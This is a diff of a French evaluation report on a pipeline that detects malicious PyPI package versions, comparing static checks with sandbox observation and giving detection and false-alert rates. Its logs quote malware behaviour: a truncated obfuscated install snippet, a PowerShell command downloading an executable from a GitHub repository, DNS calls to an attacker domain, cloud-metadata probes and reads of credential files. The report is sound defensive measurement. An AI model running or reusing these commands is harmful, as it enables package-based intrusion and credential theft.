@@ -1,22 +1,15 @@
 # Mesure sur le corpus
 
-Généré le 2026-10-10 par `python3 -I mesure/mesurer.py`, sur `demo/corpus/corpus.json` (généré le 2026-10-10T14:14:42Z) et, pour la ligne 2, `demo/corpus/corpus_code.json`.
+Généré le 2026-10-11 par `python3 -I mesure/mesurer.py`, sur `demo/corpus/corpus_code.json` (échantillons malveillants de Datadog et versions saines réelles de PyPI). Chaque ligne ajoute une couche du pipeline à la précédente.
 
 | Contrôles | Détection (malveillantes arrêtées) | Fausses alertes (saines arrêtées) |
 |---|---|---|
-| Nom seul (typosquat), corpus OpenSSF | 1 / 30 (3 %) | 0 / 50 (0 %) |
-| Contrôles statiques (nom + code), Datadog + sains | 93 / 128 (73 %) | 0 / 98 (0 %) |
+| 1. Contrôles seuls (nom + code) | 93 / 128 (73 %) | 0 / 98 (0 %) |
+| 2. + sandbox | 103 / 128 (80 %) | 0 / 98 (0 %) |
 
-Une version est arrêtée si un contrôle lève un signal FORT ou BLOQUANT.
+Une version est arrêtée si un signal est FORT ou BLOQUANT : la politique la met « à revoir » ou « bloquée », donc elle n'atteint pas les serveurs.
 
-## Nom seul (typosquat), corpus OpenSSF
-
-**Arrêtées :**
-- `prosocks 1.0.30` : typosquat : « prosocks » imite le paquet populaire « pysocks »
-
-**Malveillantes manquées (29) :** `agent-vx 0.1.0`, `pafer 0.9.8`, `webreader 2.3.8`, `media-manager5 0.1.0`, `ig-gox 1.0.0`, `anthropic-sdk 0.1.0`, `zencleaner 1.0.3.1`, `caoxiltts 0.1.1`, `infrabench 0.2.0`, `dedh-devops-automation 5.9.0`, `shortneer 0.1.0`, `spo365-graph 1.1.2`, `friendly-tools 0.2`, `friendly-greeting-tools 0.3.7`, `beautifytext 1.0.7`, `cleanup-string 1.0.0`, `bfox-build-utils 1.0.997`, `queeuees 0.0.1`, `aseitylab 0.1.1`, `scrapetools2 0.2.1`, `aseity 0.1.0`, `caracas4check 1.1.2`, `requests-cache-utils 1.0.0`, `sherpy 0.1.1`, `tego-managed-agents-test 0.1.0`, `reqparser 1.0.1`, `memoryos 2.0.34`, `auclean 0.4.4`, `snap-queue 1.0.0`
-
-## Contrôles statiques (nom + code), Datadog + sains
+## 1. Contrôles seuls (nom + code)
 
 **Arrêtées :**
 - `elementary-data 0.23.3` : code_installation : import os, subprocess, tempfile, base64; x = os.path.join(tempfile.gettempdir(), ".trinny-security-update"); result = "i ; exec_obfusque : import os, subprocess, tempfile, base64; x = os.path.join(tempfile.gettempdir(), ".trinny-security-update"); result = "i
@@ -115,23 +108,66 @@ Une version est arrêtée si un contrôle lève un signal FORT ou BLOQUANT.
 
 **Malveillantes manquées (35) :** `durabletask 1.4.1`, `durabletask 1.4.2`, `durabletask 1.4.3`, `guardrails-ai 0.10.1`, `lightning 2.6.2`, `lightning 2.6.3`, `litellm 1.82.7`, `num2words 0.5.15`, `num2words 0.5.16`, `ultralytics 8.3.41`, `ultralytics 8.3.42`, `ultralytics 8.3.46`, `0wneg 0.9.0`, `ai-labs-snippets-sdk 1.2.0`, `b10connoisseur 0.12.0`, `bytedance-chat 0.1.1`, `bytedtrace 0.1.6`, `bytedtrace 0.3.9`, `ctftestsowwy 0.1.0`, `data-pipeline-check 0.1.1`, `example-package-sthnck 0.0.1.dev1`, `fc-clip 99.6`, `git-config-sync 0.1.1`, `http3-client 1.0.15`, `kube-health-tools 2.0.0`, `my-fun-tools 0.1.2`, `pip-doom 0.1.5`, `pxz 1.1.11`, `pycapmonster 1.0`, `pydefender 1.0.3`, `pytkit 0.0.1`, `quasarlib 1.0.8`, `robloxapiaccess 0.0.1`, `websend 0.0.1`, `xboxsolver 1.0`
 
-## Fausses alertes par groupe (ligne 2)
+## 2. + sandbox
 
-- populaires : 0 / 50 (0 %)
-- peu connus : 0 / 48 (0 %)
+**Arrêtées en plus de la ligne précédente :**
+- `lightning 2.6.3` : fichier_sensible : fichiers sensibles ouverts : /etc/passwd
+- `0wneg 0.9.0` : fichier_sensible : fichiers sensibles ouverts : /etc/passwd
+- `b10connoisseur 0.12.0` : dns : requêtes DNS : kubernetes, kubernetes.default, kubernetes.default.svc, kube-dns.kube-system.svc.cluster.local, metadata, ; connexion : connexions tentées : 172.18.0.2:443, 172.18.0.2:8443, 169.254.169.254:80, 100.100.100.200:80, 169.254.170.2:80, 172.18.0 ; fichier_sensible : fichiers sensibles ouverts : /proc/7/environ, /etc/passwd
+- `bytedance-chat 0.1.1` : dns : requêtes DNS : 6fdfcce6.0wn.sh ; connexion : connexions tentées : 172.20.0.2:443, 6fdfcce6.0wn.sh:443
+- `fc-clip 99.6` : fichier_sensible : fichiers sensibles ouverts : /etc/passwd ; processus : processus lancés : /bin/sh -c ifconfig
+- `pip-doom 0.1.5` : processus : processus lancés : sh -c /usr/bin/zenity --help >/dev/null 2>&1
+- `pycapmonster 1.0` : processus : processus lancés : sh -c -- start /usr/local/bin/python /tmp/tmp4s7_dr3_, sh -c -- start /usr/local/bin/python /tmp/tmpz
+- `pytkit 0.0.1` : processus : processus lancés : powershell -Command curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o "/CBLines.e
+- `websend 0.0.1` : processus : processus lancés : powershell -Command curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o "/CBLines.e
+- `xboxsolver 1.0` : processus : processus lancés : sh -c -- start /usr/local/bin/python /tmp/tmpj0ke1me0, sh -c -- start /usr/local/bin/python /tmp/tmpz
+
+**Malveillantes manquées (25) :** `durabletask 1.4.1`, `durabletask 1.4.2`, `durabletask 1.4.3`, `guardrails-ai 0.10.1`, `lightning 2.6.2`, `litellm 1.82.7`, `num2words 0.5.15`, `num2words 0.5.16`, `ultralytics 8.3.41`, `ultralytics 8.3.42`, `ultralytics 8.3.46`, `ai-labs-snippets-sdk 1.2.0`, `bytedtrace 0.1.6`, `bytedtrace 0.3.9`, `ctftestsowwy 0.1.0`, `data-pipeline-check 0.1.1`, `example-package-sthnck 0.0.1.dev1`, `git-config-sync 0.1.1`, `http3-client 1.0.15`, `kube-health-tools 2.0.0`, `my-fun-tools 0.1.2`, `pxz 1.1.11`, `pydefender 1.0.3`, `quasarlib 1.0.8`, `robloxapiaccess 0.0.1`
+
+## Fausses alertes par groupe de versions saines
+
+| Ligne | populaires | peu connus |
+|---|---|---|
+| 1. Contrôles seuls (nom + code) | 0 / 50 (0 %) | 0 / 48 (0 %) |
+| 2. + sandbox | 0 / 50 (0 %) | 0 / 48 (0 %) |
+
+## Annexe : nom seul, corpus OpenSSF (`demo/corpus/corpus.json`)
+
+| Contrôles | Détection (malveillantes arrêtées) | Fausses alertes (saines arrêtées) |
+|---|---|---|
+| Nom seul (typosquat), corpus OpenSSF | 1 / 30 (3 %) | 0 / 50 (0 %) |
+
+Arrêtées : `prosocks 1.0.30`
 
 ## Limites
 
-- **Ligne 1 :** 26 des 30 paquets du corpus OpenSSF n'existent plus sur PyPI ; seuls leur nom et
-  leur version sont lus. Les 50 saines sont des paquets populaires, donc dans la liste du contrôle
-  de typosquat : leurs 0 % de fausses alertes sont acquis par construction.
-- **Ligne 2, détection :** les échantillons de Datadog sont plus anciens (2022 à 2026) que le corpus
-  OpenSSF, et souvent des campagnes en série (mêmes auteurs, même code). Les bibliothèques
-  compromises sont analysées en entier, sans leur version saine précédente : le pipeline, lui, ne
-  regarderait que ce qui change.
-- **Ligne 2, fausses alertes :** les règles ont été réglées sur 20 paquets populaires sains, dont
-  plusieurs sont dans les 50 « populaires » : ce groupe est donc optimiste. Le groupe « peu
-  connus » n'a servi à aucun réglage : c'est le chiffre honnête.
+- **Détection :** les échantillons de Datadog (2022 à 2026) sont souvent des campagnes en série
+  (mêmes auteurs, même code). Les bibliothèques compromises sont analysées en entier, sans leur
+  version saine précédente : le pipeline, lui, ne regarderait que ce qui change.
+- **Fausses alertes :** les règles statiques ont été réglées sur 20 paquets populaires sains, dont
+  plusieurs sont dans les 50 « populaires » : ce groupe est optimiste. Le groupe « peu connus »
+  n'a servi à aucun réglage : c'est le chiffre honnête.
+- **Sandbox (ligne 2) :**
+  - même scénario que le produit : conteneur Linux sans réseau réel, leurres, `strace`,
+    **battement de 60 s** après l'import ;
+  - les échantillons de Datadog sont dépliés : ils sont remis en sdist (s'il y a un `setup.py` ou
+    un `pyproject.toml`) ou en roue, à partir de leurs fichiers, sans rien exécuter hors de la
+    sandbox (`mesure/sandbox.py`) ;
+  - comme le produit, la sandbox installe **sans les dépendances** (`--no-deps`) : une version qui
+    a besoin des siennes pour s'importer échoue à l'import, et la sandbox n'observe alors que son
+    installation. C'est le cas de **40 des 98 versions saines** et de **12 des 25 malveillantes
+    manquées** (dont ultralytics, dont la charge part à l'import). Le 0 % de fausses alertes vaut
+    pour ce que la sandbox a pu observer ;
+  - les paquets qui visent Windows (`ctypes.windll`, PowerShell) n'agissent pas dans un conteneur
+    Linux ; certains sont vus quand même, parce qu'ils lancent `powershell` ;
+  - mesurée hors de la plateforme AWS, avec une image construite du même Dockerfile, à un détail
+    près : `strace` copié de l'hôte, le miroir Debian étant bloqué. Les rapports sont gardés dans
+    `mesure/rapports_sandbox/`.
+- **LLM/RAG (ligne 3) :** le LLM n'est interrogé que là où il peut changer le résultat (voir la note
+  plus haut) ; il tourne sur la plateforme (Ollama, `qwen2.5-coder:7b`, index du RAG).
+- **Annexe, nom seul, corpus OpenSSF :** 26 des 30 paquets n'existent plus sur PyPI ; seuls leur nom
+  et leur version sont lus. Les 50 saines sont des paquets populaires, donc dans la liste du
+  contrôle de typosquat : leurs 0 % de fausses alertes sont acquis par construction.
 - Une version arrêtée n'est pas jetée : un signal FORT la met « à revoir » (un humain tranche),
   seul un signal BLOQUANT la bloque. Une fausse alerte coûte donc une revue, pas une panne.
 - Ne sont pas comptés : les métadonnées (signaux MOYEN au plus, sans effet sur l'arrêt), la veille
